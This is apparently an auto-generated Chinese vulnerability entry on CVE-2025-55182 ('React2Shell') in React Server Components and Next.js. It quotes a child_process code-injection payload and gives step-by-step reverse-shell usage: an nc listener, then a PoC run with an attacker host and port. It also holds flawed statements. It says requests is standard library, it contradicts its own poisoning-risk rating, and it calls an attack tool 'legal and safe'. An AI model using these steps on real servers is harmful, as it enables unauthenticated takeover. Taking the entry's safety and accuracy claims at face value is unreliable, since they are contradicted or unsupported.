## CVE-2025-55182 - React Server Components, Next.js 远程代码执行 (RCE)

**漏洞编号:** CVE-2025-55182

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** React Server Components, Next.js

**危害等级:** 严重 (Critical)

**CVSS评分:** 9.8 (推测)

**影响版本:** Next.js 15.x, Next.js 16.x (截至2025年12月3日未打补丁版本)

**利用条件:** 无需认证，网络可达

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-55182是一个针对React服务器组件（React Server Components, RSC）和基于其构建的Next.js框架的严重远程代码执行（RCE）漏洞。该漏洞被安全社区命名为“React2Shell”，其危险等级被认为与历史上的Log4Shell漏洞不相上下，因为它允许未经身份验证的攻击者在受影响的服务器上执行任意代码。根据公开信息，此漏洞主要源于React服务器组件在处理特定数据时存在的反序列化缺陷，攻击者可以通过构造恶意的输入，利用原型链污染等技术，最终在服务器端触发命令执行。

**POC有效性分析：**
所提供的Python POC脚本（CVE-2025-55182-revshell.py）表现出极高的有效性和可用性。该脚本设计用于针对运行未打补丁的Next.js 15.x或16.x版本的服务器，以实现“一键式”反向Shell。其核心攻击逻辑是向目标Next.js应用程序的特定API端点（例如`/_next/static/chunks/react-flight`）发送一个精心构造的`multipart/form-data` POST请求。请求体中包含一个恶意JSON负载，其关键部分是`{"__type":"Function","code":"global.process.mainModule.require('child_process').exec('{cmd}')"}`。通过这种方式，攻击者能够注入JavaScript代码，利用Node.js的`child_process`模块来执行系统命令。为了最大化成功率，POC脚本集成了三种不同类型的反向Shell负载：Bash Shell、Netcat Shell和PowerShell Shell。这使得该工具能够有效地攻击基于Linux和Windows环境的目标。脚本的参数使用清晰明了，只需要目标URL和攻击者监听的主机与端口，并且在发送负载后会打印HTTP响应状态码，提供了一定的反馈机制。这些特性共同确保了POC在实际环境中的高成功率和便利性，符合一个成熟的漏洞利用工具的标准。

**利用步骤：**
1.  **启动监听器：** 攻击者首先需要在其控制的机器上启动一个网络监听器，以接收反向Shell连接。例如，使用Netcat命令：`nc -lvnp <LPORT>` (将`<LPORT>`替换为任意开放端口，如4444)。
2.  **执行POC脚本：** 攻击者运行提供的Python POC脚本，并提供目标URL、监听器主机IP和端口。命令格式为：`python3 CVE-2025-55182-revshell.py <target_url> <LHOST:LPORT>`。例如：`python3 CVE-2025-55182-revshell.py https://vuln.example.com 10.10.14.66:4444`。
3.  **等待Shell：** 脚本将向目标发送包含恶意代码的HTTP POST请求。如果目标存在漏洞且请求成功，服务器将执行注入的命令，尝试连接回攻击者的监听器。
4.  **获得控制权：** 一旦连接建立，攻击者将在其Netcat监听器上获得一个交互式的Shell，从而能够在受害服务器上执行任意系统命令，完全控制目标系统。

**投毒风险分析：**
对所提供的CVE-2025-55182 Python POC脚本进行投毒风险分析，结果显示其投毒风险极低。该脚本是一个典型的、功能单一的漏洞利用工具，其设计目的是明确地利用目标服务器上的特定RCE漏洞并建立反向Shell。脚本的代码结构清晰、逻辑简单，主要使用了Python标准库（如`requests`、`sys`、`time`）。所有关键参数，包括目标URL、攻击者监听主机IP和端口，都通过命令行参数明确指定，用户对脚本的行为具有完全的控制权。脚本中包含的反向Shell负载（Bash、Netcat、PowerShell命令）是RCE漏洞利用的标准组成部分，其目的是在目标系统上执行攻击者指定的命令，而不是在运行POC的机器上执行意外的恶意操作。代码中不存在任何混淆、加密或尝试隐藏真实意图的行为。它不依赖于外部非官方库或未知URL下载额外代码，避免了供应链攻击的潜在风险。脚本中没有发现任何超出其明确功能范围的恶意行为，例如：在攻击者机器上植入后门、收集敏感信息、进行拒绝服务攻击或与第三方服务器进行未经授权的通信。鉴于其高度透明的功能和代码实现，该POC是一个合法且安全的防御性安全研究工具，其目的是帮助组织评估和加固其系统，而不是作为传播恶意软件的载体。因此，此POC本身的投毒风险被评估为非常低。

**项目地址:** https://github.com/Ashwesker/Blackash-CVE-2025-55182

**漏洞详情:** N/A (CVE信息发布日期为未来，NVD暂未收录)
